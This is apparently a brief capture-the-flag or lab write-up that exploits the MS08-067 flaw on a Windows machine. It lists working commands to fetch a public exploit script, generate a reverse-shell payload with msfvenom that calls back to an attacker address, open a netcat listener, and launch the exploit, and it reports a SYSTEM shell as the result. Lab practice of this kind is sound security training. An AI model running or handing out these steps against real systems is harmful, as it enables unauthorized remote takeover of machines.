# Exploitation: MS08-067
- I used a python  script to manually exploit MS08-067

```
1. Download the script
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

2. Generate a payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.73 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows

3. chmod +x ms08.py

4. nc -lvnp 443 

5. python ms08.py 10.10.10.4 6 445
```

Launch the exploit and I have a connection on the machine as SYSTEM via netcat.
